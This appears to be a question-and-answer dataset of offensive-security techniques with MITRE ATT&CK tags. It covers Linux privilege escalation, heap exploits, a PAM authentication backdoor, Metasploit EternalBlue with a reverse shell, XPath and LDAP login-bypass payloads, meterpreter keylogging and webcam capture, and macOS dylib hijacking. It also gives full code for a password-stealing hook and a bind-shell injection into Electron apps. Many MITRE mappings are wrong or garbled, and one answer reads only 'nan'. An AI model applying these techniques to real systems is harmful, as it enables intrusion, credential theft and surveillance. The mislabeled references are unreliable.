A: The CAP_SYSLOG capability allows accessing kernel addresses via `/proc` and similar interfaces when the `kptr_restrict` setting is at 1, as well as accessing `dmesg` output when `dmesg_restrict` is set to 1. This information could potentially be used to identify and exploit kernel vulnerabilities, leading to privilege escalation, but the specific attack vectors depend on the system configuration and kernel version. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you escalate privileges by abusing the CAP_MKNOD capability?
A: The CAP_MKNOD capability allows creating special files, such as character or block devices. This can be used to create a block device that maps to a sensitive part of the host filesystem, potentially leading to privilege escalation if the container and host share the same user namespace. MITRE References: MITRE ID is T1609, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_SETPCAP capability?
A: The CAP_SETPCAP capability allows a process to modify the capability sets of other processes. This means a process with CAP_SETPCAP can add or remove capabilities from the effective, inheritable, and permitted capability sets of other processes. However, a process can only modify capabilities that are in its own permitted capability set, preventing it from elevating another process's privileges beyond its own level of privilege. MITRE References: MITRE ID is T1548.003, MITRE Name is: Abuse Elevation Control Mechanism: Sudo and Sudo Caching, and MITRE Tactics are: Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_SYS_RAWIO capability?
A: The CAP_SYS_RAWIO capability provides access to sensitive operations, including access to `/dev/mem`, `/dev/kmem`, or `/proc/kcore`, and the ability to modify `mmap_min_addr`, access `ioperm(2)` and `iopl(2)` system calls, and perform various disk commands. This capability can be exploited for privilege escalation, as it grants direct access to low-level system resources. MITRE References: MITRE ID is T1611, MITRE Name is: Escape to Host, and MITRE Tactics are: Privilege Escalation.

## Q: How can you escalate privileges by abusing the CAP_KILL capability?
A: The CAP_KILL capability allows a process to kill any other process. This can be used to terminate a service or daemon running with higher privileges, such as a root-owned process, and potentially replace it with a malicious version to escalate privileges. MITRE References: MITRE ID is T1134.001, MITRE Name is: Access Token Manipulation: Token Impersonation/Theft, and MITRE Tactics are: Defense Evasion, Privilege Escalation, Lateral Movement.

## Q: How can I exploit a heap overflow vulnerability using the "unlink" technique?
A: To exploit a heap overflow vulnerability using the "unlink" technique, you can follow these steps:1. Overwrite the `bk` and `fd` pointers of a free chunk to point to your shellcode and a location in the Global Offset Table (GOT) or `.dtors` section.2. When the chunk is freed, the `unlink` macro will be called, which will write the address of the shellcode to the location in the GOT or `.dtors` section.3. The first instruction of the shellcode should be a `jmp` to skip over the 4 bytes that will be written by the `unlink` macro.The key steps are to control the metadata of a free chunk, particularly the `bk` and `fd` pointers, to redirect the control flow to the shellcode. This technique relies on the way the `unlink` macro operates on free chunks in the heap. MITRE References: MITRE ID is T1546, MITRE Name is: Event Triggered Execution, and MITRE Tactics are: TA0004, TA0005.

## Q: How can I use the "heap spraying" technique to exploit a vulnerability?
A: Heap spraying is a technique used to increase the chances of successfully exploiting a vulnerability by filling the heap with a large amount of predictable data, typically NOP sleds leading to a shellcode.The general steps are:1. Allocate as much memory as possible on the heap, filling it with a "carpet" of NOP instructions (0x90) followed by the shellcode.2. Overflow a buffer to overwrite a pointer or return address with an address within the "carpet" of NOP sleds.3. When the overwritten pointer or return address is used, the execution will jump to the NOP sleds and eventually reach the shellcode.The goal is to increase the likelihood that the overwritten pointer or return address will point to the injected shellcode, even if the exact location is not known beforehand. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004.

## Q: How can I use the "heap feng shui" technique to exploit a heap overflow vulnerability?
A: Heap feng shui is a technique used to carefully arrange the heap layout to position a vulnerable buffer in a specific location, making it easier to exploit.The general steps are:1. Allocate and free memory chunks in a specific order to create gaps and fragments in the heap.2. Allocate the vulnerable buffer in one of the gaps created in the previous step.3. Overflow the vulnerable buffer to overwrite the metadata of the neighboring chunks.4. Exploit the overwritten metadata to redirect control flow, such as by overwriting a function pointer or return address.By carefully controlling the heap layout, the attacker can increase the chances of the vulnerable buffer being located in a predictable position, making the exploitation more reliable. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0004.

## Q: How can you create a backdoor in PAM to bypass user authentication?
A: To create a backdoor in PAM to bypass user authentication, you can follow these steps:1. Locate the authentication directive in the `common-auth` file, which typically calls the `pam_unix.so` shared library for password verification.2. Modify the source code of the `pam_unix.so` library by adding a conditional statement that grants access if a predefined password is used, otherwise, it proceeds with the usual authentication process.3. Recompile the modified `pam_unix.so` library and replace it in the appropriate directory.4. Test the backdoor by accessing various services (login, ssh, sudo, su, screensaver) with the predefined password, while normal authentication processes remain unaffected.You can automate this process using the `linux-pam-backdoor` tool: https://github.com/zephrax/linux-pam-backdoor MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you search for interesting files that may contain sensitive information or allow privilege escalation?
A: You can use tools like LinEnum or LinPEAS to search for interesting files, such as profile files, password/shadow files, web files, backups, and files with unexpected ownership or permissions. You can also use generic file search commands like `find / -type f 2>/dev/null`. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: TA0007.

## Q: How can you abuse NFS to escalate privileges?
A: If the NFS server is configured to allow root access, you can mount the NFS share as root and then access the files on the remote system with root privileges. MITRE References: MITRE ID is T1068, MITRE Name is: Exploitation for Privilege Escalation, and MITRE Tactics are: TA0004.

## Q: How can you exploit a vulnerable SNMP implementation?
A: If an SNMP implementation is vulnerable, you can attempt to exploit it in several ways:

1. Brute force common community strings like 'public', 'private', and 'community' to gain read-only or read-write access to the SNMP MIB.
2. Use tools like onesixtyone or Metasploit's SNMP modules to scan for open SNMP ports and attempt to enumerate data from the MIB.
3. If you have write access, you may be able to modify the MIB to change system settings, install malware, or escalate privileges. MITRE References: MITRE ID is T1046, MITRE Name is: Network Service Scanning, and MITRE Tactics are: Discovery.

## Q: How can you use Metasploit to exploit the Heartbleed vulnerability?
A: To exploit the Heartbleed vulnerability using Metasploit, you can follow these steps:

1. Use the 'auxiliary/scanner/ssl/openssl_heartbleed' module.
2. Set the RHOSTS option to the target IP address.
3. Set the verbose option to 'true'.
4. Run the module.

This will cause the target to leak random data from memory, which may contain sensitive information like passwords or other valuable data. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: Initial Access, Execution.

## Q: How can you use SMTP to enumerate user accounts on a target email server?
A: You can use SMTP to enumerate user accounts on a target email server in the following ways:1. Manually connect to the SMTP server using telnet or netcat and use the 'VRFY' command to check if a specific username exists. For example:telnet 192.168.1.103 25VRFY root2. Use the 'smtp-user-enum' tool from the SecLists project to automate the process of checking a wordlist of usernames against the SMTP server:smtp-user-enum -M VRFY -U /path/to/wordlist.txt -t 192.168.1.1033. In Metasploit, use the 'auxiliary/scanner/smtp/smtp_enum' module to perform SMTP user enumeration.These techniques can help you identify valid user accounts on the target email server, which may be useful for further attacks like password guessing or phishing. MITRE References: MITRE ID is T1087, MITRE Name is: Account Discovery, and MITRE Tactics are: Discovery.

## Q: How can you exploit a vulnerable SMTP server using Metasploit?
A: nan MITRE References: MITRE ID is nan, MITRE Name is: nan, and MITRE Tactics are: .

## Q: How can you use Metasploit to exploit the EternalBlue vulnerability?
A: To exploit the EternalBlue vulnerability (MS17-010) using Metasploit, you can follow these steps:1. Use the 'exploit/windows/smb/ms17_010_eternalblue' module.2. Set the 'RHOST' option to the target IP address.3. Set the 'PAYLOAD' option to the desired payload, such as 'windows/x64/meterpreter/reverse_tcp'.4. Set any other required options, such as 'LHOST' and 'LPORT' for the reverse shell.5. Run the 'exploit' command to launch the attack.This module exploits the SMB vulnerability to gain remote code execution on the target system and deploy the specified payload, which can provide you with a Meterpreter session or other desired functionality. MITRE References: MITRE ID is T1210, MITRE Name is: Exploitation of Remote Services, and MITRE Tactics are: Lateral Movement, Execution.

## Q: How can we use the OOB read feature in LOAD_NAME / LOAD_CONST opcode to get a symbol in memory?
A: We can use the OOB read feature in the LOAD_NAME and LOAD_CONST opcodes to get a symbol in memory. The core concept is simple - these opcodes retrieve an object from index `oparg` from the `consts` or `names` tuple. When `co_consts` and `co_names` are replaced with empty tuples, these opcodes will still try to access the memory at those indices, leading to an out-of-bounds read. We can use this to retrieve a name or constant from arbitrary memory offsets. One way to do this is by using a trick like `(a, b, c, ... hundreds of symbols ..., __getattribute__) if [] else [].__getattribute__(...)` to get the symbol (such as a function name) we want. MITRE References: MITRE ID is T1056.001, MITRE Name is: Input Capture: Keylogging, and MITRE Tactics are: TA0009.

## Q: How can we generate an exploit using the OOB read feature in LOAD_NAME and LOAD_CONST?
A: To generate an exploit using the OOB read feature, we can first find the offsets of useful names/constants by trying `LOAD_NAME 0`, `LOAD_NAME 1`, etc. and seeing what we can retrieve. Once we have the offsets, we can use a trick like `[a,b,c,d,e,__getattribute__] if [] else [[].__getattribute__]` to get the `__getattribute__` method (or any other name/constant we want) from the retrieved offset. We can then use this to further interact with the system and carry out our exploit. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0005.

## Q: How can you decrypt the Dropbox databases?
A: To decrypt the Dropbox databases, you need the encrypted DPAPI key, the SYSTEM and SECURITY hives, the DPAPI master keys, and the username and password of the Windows user. You can then use the `DataProtectionDecryptor` tool to recover the primary key, which can be used with CyberChef to obtain the final key to decrypt the databases. MITRE References: MITRE ID is T1528, MITRE Name is: Gather Victim Host Information, and MITRE Tactics are: TA0007.

## Q: What are some techniques to try to bypass a regular login page?
A: If you find a login page, here are some techniques to try to bypass it:

- Check for comments inside the page (scroll down and to the right?)
- Check if you can directly access the restricted pages
- Check to not send the parameters (do not send any or only 1)
- Check the PHP comparisons error: `user[]=a&pwd=b`, `user=a&pwd[]=b`, `user[]=a&pwd[]=b`
- Change content type to json and send json values (bool true included)
- If you get a response saying that POST is not supported you can try to send the JSON in the body but with a GET request with `Content-Type: application/json`
- Check nodejs potential parsing error (read [this](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)): `password[password]=1`
- If you can send a JSON object you can send `"password":{"password": 1}` to bypass the login
- Check default credentials and common combinations
- Brute-force using a bigger dictionary MITRE References: MITRE ID is T1110, MITRE Name is: Brute Force, and MITRE Tactics are: CredentialAccess.

## Q: How can SQL injection be used to bypass a login?
A: You can find several tricks to bypass the login via SQL injections at [/pentesting-web/sql-injection#authentication-bypass]. Additionally, you can try a custom list of SQL injection payloads to bypass the login at [/pentesting-web/login-bypass/sql-login-bypass]. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: InitialAccess.

## Q: What techniques can be used to bypass a login via NoSQL Injection?
A: You can find several tricks to bypass the login via NoSQL Injections at [/pentesting-web/nosql-injection#basic-authentication-bypass]. As the NoSQL Injections requires to change the parameters value, you will need to test them manually. MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: InitialAccess.

## Q: How can XPath Injection be used to bypass a login?
A: You can find several tricks to bypass the login via XPath Injection at [/pentesting-web/xpath-injection#authentication-bypass]. Some example payloads include:

```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '\nadmin' or '1'='2
``` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: InitialAccess.

## Q: How can LDAP Injection be used to bypass a login?
A: You can find several tricks to bypass the login via LDAP Injection at [/pentesting-web/ldap-injection#login-bypass]. Some example payloads include:

```
*
*)(&
*)(|(&
pwd)\n*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
``` MITRE References: MITRE ID is T1190, MITRE Name is: Exploit Public-Facing Application, and MITRE Tactics are: InitialAccess.

## Q: What is an example of a Logstash pipeline configuration that can be used for privilege escalation?
A: An example pipeline configuration that can be used for privilege escalation is:```input {  exec {    command => "whoami"    interval => 120  }}output {  file {    path => "/tmp/output.log"    codec => rubydebug  }}```Here, `interval` determines the execution frequency in seconds. In the given example, the `whoami` command runs every 120 seconds, with its output directed to `/tmp/output.log`. MITRE References: MITRE ID is T1059, MITRE Name is: Command and Scripting Interpreter, and MITRE Tactics are: Execution, Privilege Escalation.

## Q: How can a machine that has been compromised be used to learn more about the network it is a part of?
A: After gaining access to a machine, you can use it to gather more information about the network. This can be done by taking a tcpdump capture to inspect the traffic between the compromised machine and other devices on the network. You can also look for reused passwords and sensitive information in databases that could be useful for further attacks against other machines. This can help you map out the entire network and identify other systems, services, and devices that could be potential targets. MITRE References: MITRE ID is T1040, MITRE Name is: Network Sniffing, and MITRE Tactics are: Discovery.

## Q: What types of information should be collected from a compromised machine to aid in network mapping and further attacks?
A: When a machine has been compromised, you should collect information that can help map the network and identify potential targets for further attacks. This includes examining the machine for open ports, running services, and the operating system to understand the capabilities of the device. You should also look for sensitive information like passwords that could be reused on other systems, as well as any database or configuration files that may contain details about the network topology, other devices, and potential vulnerabilities. MITRE References: MITRE ID is T1082, MITRE Name is: System Information Discovery, and MITRE Tactics are: Discovery.

## Q: What meterpreter commands can be used to operate a keylogger?
A: To use a keylogger in meterpreter, use the commands 'keysscan_start', 'keyscan_dump', and 'keyscan_stop'. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: Collection.

## Q: What meterpreter commands can be used to interact with the microphone and webcam?
A: Meterpreter provides the following commands to interact with the microphone and webcam: 'record_mic' to record audio, 'webcam_chat' to start a video chat, 'webcam_list' to list available webcams, 'webcam_snap' to take a snapshot, and 'webcam_stream' to stream video. MITRE References: MITRE ID is T1123, MITRE Name is: Audio Capture, and MITRE Tactics are: Collection.

## Q: How can you extract passwords and hashes from a Windows system using meterpreter?
A: To extract passwords and hashes from a Windows system using meterpreter, you can use tools like 'fgdump.exe' to dump NTLM and LM hashes, or the Windows Credential Editor (WCE) to steal NTLM passwords from memory in cleartext. You can also manually dump the registry hives (SAM, SECURITY, SYSTEM) and extract the hashes using tools like 'secretdump.py' or 'pwdump'. MITRE References: MITRE ID is T1003, MITRE Name is: Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you extract the VNC password from a Windows system using meterpreter?
A: If you have a meterpreter shell, you can run the post-exploitation module 'use post/windows/gather/credentials/vnc' to extract the VNC password. MITRE References: MITRE ID is T1003, MITRE Name is: Credential Dumping, and MITRE Tactics are: Credential Access.

## Q: How can you escalate privileges on a system by being a member of the lxd/lxc group?
A: If you belong to the lxd or lxc group, you can become root by installing a distro builder like distrobuilder, creating a privileged alpine container, and then mounting the host filesystem into the container. This allows you to interact with the host system as root. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: What are the steps to exploit LXD/LXC privilege escalation without internet access?
A: 1. Install distrobuilder and use it to create a privileged alpine container.
2. Mount the host filesystem into the container.
3. Execute commands in the container to gain root access on the host system. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: How can you exploit LXD/LXC privilege escalation with internet access?
A: With internet access, you can follow the instructions at https://reboare.github.io/lxd/lxd-escape.html to create a privileged ubuntu container, mount the host filesystem, and gain root access. MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: Privilege Escalation.

## Q: What is the purpose of mac-robber version 1.02-13?
A: mac-robber is a digital investigation tool that collects metadata from allocated files in a mounted filesystem. This is useful during incident response when analyzing a live system or when analyzing a dead system in a lab. The data can be used by the mactime tool in The Sleuth Kit (TSK or SleuthKit only) to make a timeline of file activity. MITRE References: MITRE ID is T1005, MITRE Name is: Data from Local System, and MITRE Tactics are: Collection.

## Q: How can macchanger be used to spoof a MAC address during a penetration test to avoid detection?
A: macchanger version 1.7.0 can be used to spoof a MAC address during a penetration test. The '-m' or '--mac' option allows you to set a specific MAC address, while '-r' or '--random' can be used to set a fully random MAC address. This can help avoid detection by bypassing MAC address filtering or tracking attempts. Example usage: 'macchanger -m 00:11:22:33:44:55 eth0' or 'macchanger -r eth0'. MITRE References: MITRE ID is T1168, MITRE Name is: System Firmware, and MITRE Tactics are: Defense Evasion, Persistence.

## Q: What is the Sandbox Bypass technique using Re-opened Applications?
A: All the applications to reopen are inside the plist ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist. To bypass the sandbox, an attacker can add their own application to the list of applications that will be reopened after a restart. MITRE References: MITRE ID is T1156, MITRE Name is: Login Item, and MITRE Tactics are: Persistence, Privilege Escalation.

## Q: How can you abuse whitelist names to bypass a macOS firewall?
A: For example, you can call the malware with names of well known macOS processes like `launchd`. MITRE References: MITRE ID is T1036, MITRE Name is: Masquerading, and MITRE Tactics are: Defense Evasion.

## Q: How can you use synthetic clicks to bypass a macOS firewall?
A: If the firewall asks for permission from the user, you can make the malware click on 'allow'. MITRE References: MITRE ID is T1514, MITRE Name is: Elevated Execution with Prompt, and MITRE Tactics are: Privilege Escalation, Defense Evasion.

## Q: How can you use Apple-signed binaries to bypass a macOS firewall?
A: You can use binaries like `curl` or `whois` that are signed by Apple. MITRE References: MITRE ID is T1064, MITRE Name is: Scripting, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can you use well-known Apple domains to bypass a macOS firewall?
A: The firewall could be allowing connections to well-known Apple domains such as `apple.com` or `icloud.com`. You can use iCloud as a C2 server. MITRE References: MITRE ID is T1071, MITRE Name is: Application Layer Protocol, and MITRE Tactics are: Command and Control.

## Q: How can you abuse DNS to bypass a macOS firewall?
A: DNS resolutions are done via the `mdnsreponder` signed application, which is likely allowed to contact DNS servers. MITRE References: MITRE ID is T1568, MITRE Name is: Dynamic Resolution, and MITRE Tactics are: Command and Control.

## Q: How can you use browser apps to bypass a macOS firewall?
A: You can use `osascript` to automate Safari, or run Google Chrome, Firefox, or Safari in headless mode to bypass the firewall. MITRE References: MITRE ID is T1218, MITRE Name is: Signed Binary Proxy Execution, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can you use process injection to bypass a macOS firewall?
A: If you can inject code into a process that is allowed to connect to any server, you can bypass the firewall protections. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: Execution, Privilege Escalation, Defense Evasion.

## Q: How can you create an app to launch arbitrary commands from inside the default macOS sandbox?
A: To create an app to launch arbitrary commands from inside the default macOS sandbox:1. Compile the application:main.mCopy```#include <Foundation/Foundation.h>int main(int argc, const char * argv[]) {    @autoreleasepool {        while (true) {            char input[512];            printf("Enter command to run (or 'exit' to quit): ");            if (fgets(input, sizeof(input), stdin) == NULL) {                break;            }            // Remove newline character            size_t len = strlen(input);            if (len > 0 && input[len - 1] == '\n') {                input[len - 1] = '\0';            }            if (strcmp(input, "exit") == 0) {                break;            }            system(input);        }    }    return 0;}```Compile it running: `clang -framework Foundation -o SandboxedShellApp main.m`2. Build the `.app` bundle3. Define the entitlements4. Sign the app (you need to create a certificate in the keychain) MITRE References: MITRE ID is T1548, MITRE Name is: Abuse Elevation Control Mechanism, and MITRE Tactics are: Privilege Escalation.

## Q: How can you create and set up a NIB file to execute arbitrary code?
A: 1. Create a new NIB file using XCode.
2. Add an Object to the interface, setting its class to `NSAppleScript`.
3. Configure the initial `source` property via User Defined Runtime Attributes.
4. Integrate a button to activate the `Apple Script` object, specifically triggering the `executeAndReturnError:` selector.
5. Test by running in the XCode debugger and clicking the button. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can you use a malicious .xib file to execute arbitrary code?
A: You can access and review a [**sample of a malicious .xib file**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4) that demonstrates executing arbitrary code. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Execution, Defense Evasion.

## Q: How can you perform Dyld Hijacking on macOS?
A: To perform Dyld Hijacking on macOS, you can follow these steps:

1. Locate the targeted vulnerable binary, in this case, `/Applications/VulnDyld.app/Contents/Resources/lib/binary`.

2. Check the code signing entitlements of the binary using `codesign -dv --entitlements :- "/Applications/VulnDyld.app/Contents/Resources/lib/binary"`. This will show that the binary has the `com.apple.security.cs.disable-library-validation` entitlement, which means it's not checking the signature of the loaded libraries.

3. Identify the `@rpath` locations used by the binary using `otool -l "/Applications/VulnDyld.app/Contents/Resources/lib/binary" | grep LC_RPATH -A 2`. This shows that the binary is trying to load libraries from `@loader_path/.` and `@loader_path/../lib2`.

4. Create a malicious library `lib.dylib` that executes arbitrary code and re-exports the legitimate library. Compile it with the expected versions using `gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"`.

5. Update the re-export path in the malicious library to use the absolute path to the legitimate library using `install_name_tool -change @rpath/lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" /tmp/lib.dylib`.

6. Copy the malicious `lib.dylib` library to the hijacked location: `cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"`.

7. Execute the vulnerable binary, and the malicious library will be loaded, executing the arbitrary code. MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: Defense Evasion, Privilege Escalation.

## Q: How can you use the `--remote-debugging-port` parameter to steal information from an Electron application?
A: Using the param `--remote-debugging-port=9222` it's possible to steal some information from the Electron App like the history (with GET commands) or the cookies of the browser (as they are decrypted inside the browser and there is a json endpoint that will give them). You can learn how to do that in [here](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) and [here](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and use the automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) or a simple script. MITRE References: MITRE ID is T1212, MITRE Name is: Exploitation for Client Execution, and MITRE Tactics are: Execution, Credential Access.

## Q: How can you use the `electroniz3r` tool to find and exploit vulnerable Electron applications?
A: The tool [electroniz3r](https://github.com/r3ggi/electroniz3r) can be easily used to find vulnerable electron applications installed and inject code on them. This tool will try to use the `--inspect` technique:

```
# Find electron apps
./electroniz3r list-apps

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell
``` MITRE References: MITRE ID is T1211, MITRE Name is: Exploitation for Defense Evasion, and MITRE Tactics are: Defense Evasion, Privilege Escalation, Execution.

## Q: How can you access the content of a file through the /.vol/ directory?
A: You can access the content of a file through the /.vol/ directory by running `cat /.vol/[volume_id]/[inode_number]`, where the volume id and inode number can be obtained by running `stat [filename]`. MITRE References: MITRE ID is T1083, MITRE Name is: File and Directory Discovery, and MITRE Tactics are: Discovery.

## Q: How can you overwrite a file/folder owned by root?
A: One parent directory owner in the path is the user, one parent directory owner in the path is a users group with write access, or a users group has write access to the file. With any of these combinations, an attacker could inject a sym/hard link the expected path to obtain a privileged arbitrary write. MITRE References: MITRE ID is T1044, MITRE Name is: File and Directory Permissions Modification, and MITRE Tactics are: Persistence, Privilege Escalation, Defense Evasion.

## Q: How can you bypass code signatures on macOS?
A: Bundles contain the file _CodeSignature/CodeResources which contains the hash of every single file in the bundle. However, there are some files whose signature won't be checked, as they have the key 'omit' set to 'true' in the plist. You can calculate the signature of a resource from the CLI with 'openssl dgst -binary -sha1 /path/to/file | openssl base64'. MITRE References: MITRE ID is T1553, MITRE Name is: Subvert Trust Controls, and MITRE Tactics are: Defense Evasion.

## Q: How to hook functions in macOS to steal sensitive information like passwords?
A: To hook functions in macOS to steal sensitive information like passwords:1. Create a malicious dylib with the hooking code:```objective-c// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib#include <Foundation/Foundation.h>#import <objc/runtime.h>static IMP real_setPassword = NULL;static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL){    NSLog(@"[+] Password is: %@", password);    return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);}__attribute__((constructor))static void customConstructor(int argc, const char **argv) {    Class classMPDocument = NSClassFromString(@"MPDocument");    Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));    IMP fake_IMP = (IMP)custom_setPassword;    real_setPassword = method_setImplementation(real_Method, fake_IMP);}```2. Inject the malicious dylib into the target application by modifying its Info.plist to include the `DYLD_INSERT_LIBRARIES` environment variable:```xml<key>LSEnvironment</key><dict>    <key>DYLD_INSERT_LIBRARIES</key>     <string>/Applications/Application.app/Contents/malicious.dylib</string></dict>```3. Re-register the modified application with the command:`/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app`Now, whenever the target application's `setPassword:keyFileURL:` method is called, the custom implementation will log the password and call the original method. MITRE References: MITRE ID is T1056, MITRE Name is: Input Capture, and MITRE Tactics are: TA0009.

## Q: What are some known Gatekeeper bypass techniques that have been assigned CVEs in the past?
A: Some known Gatekeeper bypass techniques that have been assigned CVEs in the past include:- [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810): Bypassing Gatekeeper by using the Archive Utility to extract files with paths exceeding 886 characters.- [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper): Bypassing Gatekeeper by creating an Automator application that points to a system Automator Application Stub.- [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/): Bypassing Gatekeeper by creating a zip file that starts compressing from the Contents directory of an application.- [CVE-2022-32910](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/): Bypassing Gatekeeper by using the Apple Archive format to bypass the quarantine attribute.- [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/): Bypassing Gatekeeper by using ACLs to prevent the quarantine attribute from being set.- [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/): Bypassing Gatekeeper by exploiting a macOS issue where Google Chrome didn't set the quarantine attribute.- [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/): Bypassing Gatekeeper by creating a DMG file application using the AppleDouble name convention. MITRE References: MITRE ID is T1553.004, MITRE Name is: Subvert Trust Controls: Genrate RSA Keypair, and MITRE Tactics are: Defense Evasion.

## Q: How can you inject shellcode into a thread via the task port of a process?
A: You can use the `sc_injector.m` code to allocate memory in the remote process, write the shellcode to the allocated memory, and then create a new thread to execute the shellcode. The code can be compiled with `gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector` and run with `./sc_injector <pid or process name>`. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0005, TA0004.

## Q: How can you hijack a thread of a process via the task port?
A: You can use the techniques described in the "Thread Hijacking via Task port" section to hijack a thread of a process and execute your own code within the context of that thread. MITRE References: MITRE ID is T1055, MITRE Name is: Process Injection, and MITRE Tactics are: TA0005, TA0004.

## Q: How can you use a Java agent to inject arbitrary commands into a Java application?
A: You can create a Java agent and use the `_JAVA_OPTIONS` environment variable to load the agent when executing the Java application. For example:

```export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"# Oropen --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"```

The agent code can be:```javaimport java.io.*;import java.lang.instrument.*;public class Agent {  public static void premain(String args, Instrumentation inst) {    try {      String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };      Runtime.getRuntime().exec(commands);    }    catch (Exception err) {      err.printStackTrace();    }  }}```

To compile the agent, run:```javac Agent.java # Create Agent.classjar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar```

With `manifest.txt`:```Premain-Class: AgentAgent-Class: AgentCan-Redefine-Classes: trueCan-Retransform-Classes: true``` MITRE References: MITRE ID is T1134, MITRE Name is: Access Token Manipulation, and MITRE Tactics are: TA0004, TA0005.

## Q: How can you use the `vmoptions` file to modify Java parameters and execute arbitrary commands?
A: The `vmoptions` file supports the specification of Java parameters when Java is executed. You can use this to change the Java parameters and make the process execute arbitrary commands.

Moreover, the `vmoptions` file can also include others with the `include` directory, so you could also change an included file.

Some applications, like Android Studio, indicate in their output where they are looking for these files, for example:

```/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions``` MITRE References: MITRE ID is T1574, MITRE Name is: Hijack Execution Flow, and MITRE Tactics are: TA0005.

